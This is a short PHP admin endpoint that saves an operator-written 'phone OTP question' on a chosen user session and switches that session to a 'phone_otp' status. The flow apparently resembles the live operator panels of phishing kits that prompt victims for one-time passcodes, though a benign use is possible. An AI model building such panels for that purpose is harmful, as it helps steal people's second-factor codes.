<?php
// admin/update_phone_otp_question.php
session_start();
require_once __DIR__ . '/../includes/db.php';

if (empty($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true) {
    echo json_encode(['error' => 'not admin']);
    exit;
}

$sessionId = $_POST['session_id'] ?? null;
$question  = $_POST['question'] ?? null;

if ($sessionId && $question) {
    // Save the question in a new session field 'phone_otp_question'
    updateSessionField($sessionId, 'phone_otp_question', $question);
    // Update the session status to 'phone_otp' (with admin as source)
    updateSessionStatus($sessionId, 'phone_otp', 'admin');
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['error' => 'Missing parameters']);
}
